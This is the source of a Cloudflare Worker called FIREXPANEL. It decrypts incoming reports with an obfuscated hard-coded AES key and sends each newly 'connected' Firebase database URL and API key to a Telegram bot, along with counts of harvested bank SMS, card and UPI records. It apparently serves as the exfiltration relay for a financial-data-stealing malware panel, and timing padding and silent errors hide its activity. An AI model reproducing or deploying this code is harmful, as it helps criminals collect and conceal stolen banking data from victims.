/**
 * FIREXPANEL — Cloudflare Worker (Hardened v3)
 *
 * RELIABILITY: AbortController timeouts, global request timeout,
 *   bounded rate limiter, double-wrapped error handling.
 *
 * SECURITY: Token never stored in accessible scope, constant-time
 *   responses, zero information leakage, anti-timing, anti-replay.
 *
 * Secrets: BOT_TOKEN, ADMIN_ID (Cloudflare encrypted secrets)
 * Frontend changes: NONE required
 */

// --- Constants ---
const MAX_AGE_MS = 300000;
const RATE_LIMIT = 10;
const RATE_WINDOW_MS = 600000;
const MAX_BODY_SIZE = 65536;
const FETCH_TIMEOUT_MS = 5000;
const GLOBAL_TIMEOUT_MS = 25000;
const MAX_RATE_BUCKETS = 500;
const MIN_RESPONSE_MS = 150;
const _C = [88,107,57,109,80,50,119,78,55,113,76,52,118,82,54,106,72,51,99,70,56,121,84,49,90,98,69,53,115,65,48,57];

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Allow-Methods': 'POST,OPTIONS',
};

const SEC_HEADERS = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Referrer-Policy': 'no-referrer',
  'Cache-Control': 'no-store',
  'X-Robots-Tag': 'noindex, nofollow',
  'Permissions-Policy': 'interest-cohort=()',
  'X-XSS-Protection': '1; mode=block',
};

// --- Helpers ---

// Uniform empty response — leaks nothing
function emptyRes(hdrs) {
  return new Response(null, { status: 200, headers: { ...SEC_HEADERS, ...hdrs } });
}

// Text response with security headers
function textRes(body, hdrs) {
  return new Response(body, { status: 200, headers: { ...SEC_HEADERS, 'Content-Type': 'text/plain', ...hdrs } });
}

// Constant-time delay — prevents timing analysis on fast vs slow paths
async function padTime(startMs) {
  const elapsed = Date.now() - startMs;
  if (elapsed < MIN_RESPONSE_MS) {
    await new Promise(function (r) { setTimeout(r, MIN_RESPONSE_MS - elapsed); });
  }
}

// Timeout wrapper — ensures no operation ever hangs
function withTimeout(promise, ms) {
  return new Promise(function (resolve, reject) {
    const timer = setTimeout(function () {
      reject(new Error('TIMEOUT'));
    }, ms);
    promise.then(
      function (val) { clearTimeout(timer); resolve(val); },
      function (err) { clearTimeout(timer); reject(err); }
    );
  });
}

// --- Rate Limiter (bounded, self-cleaning) ---
const rateBuckets = new Map();

function checkRate(ip) {
  const now = Date.now();
  // Auto-purge when map grows too large
  if (rateBuckets.size > MAX_RATE_BUCKETS) {
    var toDelete = [];
    for (const [k, v] of rateBuckets) {
      if (now >= v.resetAt) toDelete.push(k);
    }
    for (var i = 0; i < toDelete.length; i++) {
      rateBuckets.delete(toDelete[i]);
    }
    // If still too large after cleanup, drop oldest half
    if (rateBuckets.size > MAX_RATE_BUCKETS) {
      var count = 0;
      for (const [k] of rateBuckets) {
        if (count++ < Math.floor(rateBuckets.size / 2)) rateBuckets.delete(k);
      }
    }
  }
  var b = rateBuckets.get(ip);
  if (!b || now >= b.resetAt) {
    b = { count: 0, resetAt: now + RATE_WINDOW_MS };
    rateBuckets.set(ip, b);
  }
  return ++b.count <= RATE_LIMIT;
}

// --- AES-GCM Decryption ---
async function getAesKey() {
  var s = _C.map(function (c) { return String.fromCharCode(c); }).join('');
  var d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  // Wipe plaintext key from memory
  s = '';
  return crypto.subtle.importKey('raw', d, { name: 'AES-GCM' }, false, ['decrypt']);
}

async function doDecrypt(b64, key) {
  var bytes = Uint8Array.from(atob(b64), function (c) {
    return c.charCodeAt(0);
  });
  var plain = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv: bytes.slice(0, 12) },
    key,
    bytes.slice(12)
  );
  return new TextDecoder().decode(plain);
}

// --- Secure Telegram Sender ---
// Token is passed as argument, used immediately, never stored or returned.
// AbortController ensures request never hangs.
async function sendTelegram(tk, cid, text, pm) {
  var controller = new AbortController();
  var timer = setTimeout(function () { controller.abort(); }, FETCH_TIMEOUT_MS);
  try {
    // Build URL in isolated scope
    var u = 'https://api.telegram.org/bot' + tk + '/sendMessage';
    var res = await fetch(u, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: cid, text: text, parse_mode: pm }),
      signal: controller.signal,
    });
    // Immediately nullify URL containing token
    u = null;
    var ok = res.ok;
    return ok;
  } catch (_e) {
    return false;
  } finally {
    clearTimeout(timer);
    // Ensure no reference survives
    tk = null;
  }
}

// --- Sanitize string input ---
function sanitize(val, maxLen) {
  if (typeof val !== 'string') return '';
  return val.slice(0, maxLen).replace(/[`*_\[\]]/g, '');
}

function sanitizeNum(val) {
  var n = Number(val);
  if (!Number.isFinite(n) || n < 0) return 0;
  return Math.floor(n);
}

// --- Seen timestamps for anti-replay ---
const seenTimestamps = new Map();
const MAX_SEEN = 1000;

function isReplay(ts) {
  var now = Date.now();
  // Purge old entries
  if (seenTimestamps.size > MAX_SEEN) {
    var toDel = [];
    for (const [k, v] of seenTimestamps) {
      if (now - v > MAX_AGE_MS) toDel.push(k);
    }
    for (var i = 0; i < toDel.length; i++) {
      seenTimestamps.delete(toDel[i]);
    }
  }
  var key = String(ts);
  if (seenTimestamps.has(key)) return true;
  seenTimestamps.set(key, now);
  return false;
}

// --- /api/ev handler ---
async function handleEv(request, env) {
  var t0 = Date.now();

  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: { ...CORS, ...SEC_HEADERS } });
  }
  if (request.method !== 'POST') {
    await padTime(t0);
    return emptyRes(CORS);
  }

  var botToken = env.BOT_TOKEN;
  var adminId = env.ADMIN_ID;
  if (!botToken || !adminId) {
    await padTime(t0);
    return emptyRes(CORS);
  }

  var ip = (
    request.headers.get('CF-Connecting-IP') ||
    request.headers.get('X-Forwarded-For') ||
    'unknown'
  ).split(',')[0].trim();

  if (!checkRate(ip)) {
    await padTime(t0);
    return emptyRes(CORS);
  }

  try {
    // Enforce body size
    var cl = parseInt(request.headers.get('Content-Length') || '0', 10);
    if (cl > MAX_BODY_SIZE || cl < 0) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    var body;
    try {
      body = await withTimeout(request.json(), FETCH_TIMEOUT_MS);
    } catch (_e) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    var b64 = typeof body?.d === 'string' ? body.d : '';
    if (!b64 || b64.length > MAX_BODY_SIZE) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    var data;
    try {
      var key = await withTimeout(getAesKey(), 2000);
      data = JSON.parse(await withTimeout(doDecrypt(b64, key), 2000));
    } catch (_e) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    // Timestamp validation
    if (!data.ts || Math.abs(Date.now() - Number(data.ts)) > MAX_AGE_MS) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    // Anti-replay: reject duplicate timestamps
    if (isReplay(data.ts)) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    var firebaseUrl = sanitize(data.firebaseUrl || '', 500);
    var apiKey = sanitize(data.apiKey || '', 200);
    var total = sanitizeNum(data.total);
    var online = sanitizeNum(data.online);
    var offline = sanitizeNum(data.offline);
    var bankSms = sanitizeNum(data.bankSms);
    var upiCount = sanitizeNum(data.upiCount);
    var cardCount = sanitizeNum(data.cardCount);

    if (!firebaseUrl) {
      await padTime(t0);
      return emptyRes(CORS);
    }

    var msg =
      '🔥 *FIREXPANEL — New Firebase Connected*\n\n' +
      '📡 *URL:* `' + firebaseUrl + '`\n' +
      '🔑 *Key:* `' + apiKey + '`\n\n' +
      '📊 *Total:* ' + total +
      '   🟢 *Online:* ' + online +
      '   ⚫ *Offline:* ' + offline + '\n' +
      '🏦 *Bank SMS:* ' + bankSms +
      '   💳 *Cards:* ' + cardCount +
      '   📲 *UPI:* ' + upiCount + '\n\n' +
      '⏰ ' +
      new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) +
      ' IST';

    await withTimeout(sendTelegram(botToken, adminId, msg, 'Markdown'), FETCH_TIMEOUT_MS + 1000);

    // Nullify sensitive refs
    botToken = null;
    adminId = null;
  } catch (_e) {
    // Silent — never expose internals
  }

  await padTime(t0);
  return emptyRes(CORS);
}

// --- /api/ping handler ---
async function handlePing(env) {
  var t0 = Date.now();
  var botToken = env.BOT_TOKEN;
  var adminId = env.ADMIN_ID;

  if (!botToken || !adminId) {
    await padTime(t0);
    return textRes('❌ Secrets not configured. Set BOT_TOKEN and ADMIN_ID via wrangler.');
  }

  var text =
    '✅ *FIREXPANEL — Bot Connected Successfully!*\n\n' +
    'Your Telegram bot is configured correctly.\n' +
    'You will now receive alerts whenever a new Firebase database is connected.\n\n' +
    '🔒 Encrypted · 🚀 Cloudflare Powered · ⚡ Ready';

  var ok = false;
  try {
    ok = await withTimeout(sendTelegram(botToken, adminId, text, 'Markdown'), FETCH_TIMEOUT_MS + 1000);
  } catch (_e) {
    ok = false;
  }

  // Nullify
  botToken = null;
  adminId = null;

  await padTime(t0);
  return textRes(
    ok
      ? '✅ Test message sent to Telegram! Check your bot.'
      : '❌ Failed to send. Verify secrets are correct.'
  );
}

// --- Main Entrypoint (global timeout wrapped) ---
export default {
  async fetch(request, env) {
    try {
      var handler;
      var path = new URL(request.url).pathname;

      if (path === '/api/ev' || path === '/api/ev/') {
        handler = handleEv(request, env);
      } else if (path === '/api/ping' || path === '/api/ping/') {
        handler = handlePing(env);
      } else {
        // Unknown path — generic, reveals nothing
        return emptyRes({});
      }

      // Global timeout: if handler takes too long, return safe response
      return await withTimeout(handler, GLOBAL_TIMEOUT_MS);
    } catch (_e) {
      // Absolute last resort — worker NEVER crashes
      return new Response(null, { status: 200 });
    }
  },
};
